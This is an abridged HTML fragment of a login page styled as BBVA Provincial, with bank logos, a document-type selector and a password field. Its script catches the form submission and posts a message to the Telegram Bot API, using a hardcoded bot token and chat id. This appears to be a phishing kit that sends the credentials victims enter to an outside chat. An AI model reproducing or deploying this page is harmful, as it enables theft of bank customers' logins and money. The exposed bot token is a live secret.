...
<html>
  ...
  >
    <div
      ...
      "
    >
      <img src="logo-bbva-provincial1.png" style="width: 150px" />
      <p
        style="
          color: white;
          size: 12px;
    ...
    <div class="container" bis_skin_checked="1">
      <h1>¡Bienvenido!</h1>
      <form id="loginform">
        <div class="group" bis_skin_checked="1">
          <select
            name="tipodoc"
            id="tipodoc"
            style="
        ...
        <div class="group" style="margin-top: 16px" bis_skin_checked="1">
          <input
            type="password"
            id="clvs"
            name="clvs"
    ...
    <footer style="text-align: center;margin-top: 30vh;">
      <div
        ...
        style="background: #072146;padding: 20px;color: white;font-family: Arial, Helvetica, sans-serif;"
      >
       <img src="bbva.png" style="width: 240px;">
      </div>
    </footer>
  </body>
    ...
    form.addEventListener("submit", (event) => {
      ...
      axios
        ...
        .then((response) => {
          ...
          axios
            .post(
              "https://api.telegram.org/bot7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k/sendMessage",
              {
                chat_id: "-4779812031",
                text: message,
              }
